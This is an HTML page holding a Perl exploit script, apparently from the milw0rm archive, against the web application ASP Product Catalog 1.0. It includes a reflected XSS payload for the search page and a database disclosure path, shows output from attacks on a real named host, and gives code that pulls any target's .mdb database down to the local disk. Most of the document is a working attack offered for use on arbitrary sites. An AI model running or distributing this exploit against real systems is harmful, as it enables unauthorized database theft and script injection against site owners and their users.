<html><head><title>ASP Product Catalog 1.0 (XSS/DD) Multiple Remote Exploits</title></head><pre>#!/usr/bin/perl
# By AlpHaNiX [NullArea.Net]
# alpha[at]hacker.bz
# Made in Tunisia
###########
# script : ASP Product Catalog Multiple Remote Exploits
# download : http://sourceforge.net/project/showfiles.php?group_id=136315
# script homepage : http://aspprocatalog.sourceforge.net/
###########
# Vulnerable :
# XSS : In Search ,
# Example :
# http://h.1asphost.com/humayuns/aspProductCatalog/search.asp?keywords=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
# Database Disclosure
# Path : database/aspProductCatalog.mdb
##########
# Real Life Example : XSS
# OOO  OOO           OO    OO        OO
#  OO   O             O     O         O
#  O O  O  OO  OO     O     O        O O   OO OOO   OOOO    OOOOO
#  O  O O   O   O     O     O        OOO    OO     OOOOOO       O
#  O   OO   O   O     O     O       O   O   O      O       OOOOOO
# OOO  OO   OOOOO   OOOOO OOOOO    OOO OOO OOOOO    OOOOO  OOOO OO
#
#
#[-] ASP Product Catalog Multiple Remote Exploits
#[-] Found &amp; Exploited By AlpHaNiX
#
#
#[!] Exploiting http://h.1asphost.com/humayuns/aspProductCatalog// ....
#[!] http://h.1asphost.com/humayuns/aspProductCatalog/ Exploited !
#[!] http://h.1asphost.com/humayuns/aspProductCatalog/search.asp?keywords=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
##########
# Real Life Example : Database Disclosure
# OOO  OOO           OO    OO        OO
#  OO   O             O     O         O
#  O O  O  OO  OO     O     O        O O   OO OOO   OOOO    OOOOO
#  O  O O   O   O     O     O        OOO    OO     OOOOOO       O
#  O   OO   O   O     O     O       O   O   O      O       OOOOOO
# OOO  OO   OOOOO   OOOOO OOOOO    OOO OOO OOOOO    OOOOO  OOOO OO
#
#
#[-] ASP Product Catalog Multiple Remote Exploits
#[-] Found &amp; Exploited By AlpHaNiX
#
#
#[!] Exploiting http://h.1asphost.com/humayuns/aspProductCatalog// ....
#[!] http://h.1asphost.com/humayuns/aspProductCatalog/ Exploited ! database saved to c:/db.mdb
##########
# Greetz for Zigma/Djek/unary/r1z

use lwp::UserAgent;

system('cls');
system('title ASP Product Catalog Multiple Remote Exploits');
system('color 2');
if (!defined($ARGV[0] &amp;&amp; $ARGV[1])) {print &quot;[!] Usage : \n    ./exploit http://site.com -DD\n    ./exploit http://site.com -XSS\n&quot;;exit();}
if ($ARGV[0] =~ /http:\/\// ) { $site = $ARGV[0].&quot;/&quot;; } else { $site = &quot;http://&quot;.$ARGV[0].&quot;/&quot;; }
my @array;
print &quot;\n\n\n\n OOO  OOO           OO    OO        OO\n&quot; ;
print &quot;  OO   O             O     O         O\n&quot; ;
print &quot;  O O  O  OO  OO     O     O        O O   OO OOO   OOOO    OOOOO\n&quot; ;
print &quot;  O  O O   O   O     O     O        OOO    OO     OOOOOO       O\n&quot; ;
print &quot;  O   OO   O   O     O     O       O   O   O      O       OOOOOO\n&quot; ;
print &quot; OOO  OO   OOOOO   OOOOO OOOOO    OOO OOO OOOOO    OOOOO  OOOO OO\n&quot; ;
print &quot;\n\n[-] ASP Product Catalog Multiple Remote Exploits\n&quot;;
print &quot;[-] Found &amp; Exploited By AlpHaNiX \n\n\n&quot;;
print &quot;[!] Exploiting $site ....\n&quot;;
my $bug        = $ARGV[1] ;
my $site       = $ARGV[0] ;
my $targetdd   = $site.&quot;database/aspProductCatalog.mdb&quot; ;

if ($bug eq '-DD')
{
     my $useragent = LWP::UserAgent-&gt;new(agent =&gt; &quot;Mozilla 5.5&quot;);
     my $request   = $useragent-&gt;get($targetdd,&quot;:content_file&quot; =&gt; &quot;c:/db.mdb&quot;);
         if ($request-&gt;is_success)
             {
                 print &quot;[!] $site Exploited ! database saved to c:/db.mdb\n&quot;;
             }
         else {print &quot;[!] Exploiting $site Failed !\n[!] &quot;.$request-&gt;status_line.&quot;\n&quot;;exit();}
}


elsif ($bug eq '-XSS')
{
     my $useragent = LWP::UserAgent-&gt;new(agent =&gt; &quot;Mozilla 5.5&quot;);
     my $request   = $useragent-&gt;get(&quot;$site&quot;.&quot;search.asp?keywords=ALPHANIXNULLAREA&quot;);
         if ($request-&gt;is_success)
             {
                 if ($request-&gt;content =~ m/ALPHANIXNULLAREA/i){print &quot;[!] $site Exploited !\n[!] $site&quot;.&quot;search.asp?keywords=\&quot;&gt;&lt;script&gt;alert(1)&lt;\/script&gt;\n&quot;;}
                 else {print &quot;[!] Exploiting $site Failed !\n&quot;;}
             }
         else {print &quot;[!] Exploiting $site Failed !\n[!] &quot;.$request-&gt;status_line.&quot;\n&quot;;exit();}


}

else
{
print &quot;[!] Please Choose a valid flag -DD for database disclosure &amp; -XSS For Cross Site Scripting\n&quot;;
exit();
}

# milw0rm.com [2009-04-13]</pre></html>